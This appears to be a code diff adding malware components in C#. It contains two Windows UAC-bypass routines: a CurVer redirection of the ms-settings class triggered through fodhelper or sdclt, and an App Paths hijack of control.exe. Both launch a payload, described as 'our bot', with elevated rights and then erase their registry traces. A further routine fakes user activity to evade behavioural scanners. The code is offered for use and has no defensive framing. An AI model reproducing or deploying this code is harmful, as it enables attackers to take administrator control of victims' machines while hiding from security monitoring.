+        /// Method I: CurVer Redirection (Stealth V3).
+        /// Redirects 'ms-settings' to a custom class to hide from behavioral scanners.
+        /// </summary>
+        private static bool BypassCurVer(string payloadPath, string args, string evName, string trigger = "fodhelper.exe")
+        {
+            try
+            {
+                Log("Method I: CurVer Redirection (GHOST)...");
+                string customClass = $"vgc_{Guid.NewGuid():N}";
+                string classPath = $@"Software\Classes\{customClass}\shell\open\command";
+                string curVerPath = @"Software\Classes\ms-settings\CurVer";
+
+                // 1. Create the shadow class
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(classPath))
+                {
+                    key.SetValue("", $"\"{payloadPath}\" {args}", RegistryValueKind.String);
+                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
+                }
+
+                // 2. Point ms-settings to the shadow class via CurVer
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(curVerPath))
+                {
+                    key.SetValue("", customClass);
+                }
+
+                // 3. Trigger via sdclt (High fidelity)
+                string sysdir = Environment.GetFolderPath(Environment.SpecialFolder.System);
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = Path.Combine(sysdir, trigger),
+                    Arguments = trigger == "sdclt.exe" ? "/kickoffgui" : "",
+                    UseShellExecute = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                };
+
+                Process.Start(psi);
+                bool ok = WaitForAdminSuccess(12000, evName);
+
+                // 4. Cleanup
+                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false); } catch { }
+                try { Registry.CurrentUser.DeleteSubKeyTree($@"Software\Classes\{customClass}", false); } catch { }
+
+                if (ok) Log("Method I OK");
+                return ok;
+            }
+            catch (Exception ex) { Log($"Method I ex: {ex.Message}"); return false; }
+        }
+
+        /// <summary>
+        /// Method U: AppPaths Hijack (Universal Stealth).
+        /// Redirects 'control.exe' or similar to our bot via App Paths.
+        /// Bypasses ms-settings monitoring.
+        /// </summary>
+        private static bool BypassAppPaths(string payloadPath, string args, string evName, string target = "control.exe")
+        {
+            try
+            {
+                Log($"Method U: AppPaths Hijack ({target})...");
+                string keyPath = $@"Software\Microsoft\Windows\CurrentVersion\App Paths\{target}";
+                
+                // 1. Create the AppPath entry
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
+                {
+                    key.SetValue("", payloadPath, RegistryValueKind.String);
+                    key.SetValue("Path", Path.GetDirectoryName(payloadPath), RegistryValueKind.String);
+                }
+
+                // 2. Trigger via ShellExecute
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = target,
+                    Arguments = args,
+                    UseShellExecute = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                };
+
+                Process.Start(psi);
+                bool ok = WaitForAdminSuccess(12000, evName);
+
+                // 3. Cleanup
+                try { Registry.CurrentUser.DeleteSubKeyTree(keyPath, false); } catch { }
+
+                if (ok) Log("Method U OK");
+                return ok;
+            }
+            catch (Exception ex) { Log($"Method U ex: {ex.Message}"); return false; }
+        }
+
+        private static void DoBehavioralReputation()
+        {
+            try
+            {
+                Log("Stage 4: Building Behavioral Reputation...");
+                Random rnd = new Random();
+                
+                // 1. Legitimate system queries
+                for (int i = 0; i < 5; i++)
+                {
+                    IntPtr hwnd = Native.GetForegroundWindow();
+                    Native.GetCursorPos(out var pt);
+                    System.Threading.Thread.Sleep(rnd.Next(200, 800));
+                }
+
+                // 2. Behavioral Noise (Environment variables)
+                var env = Environment.GetEnvironmentVariables();
+                Log($"Reputation: Scanned {env.Count} env vars.");
+
+                // 3. Jitter
+                System.Threading.Thread.Sleep(rnd.Next(1000, 3000));
+            }
+            catch { }
         }
 
         private static void DoBehavioralNoise()
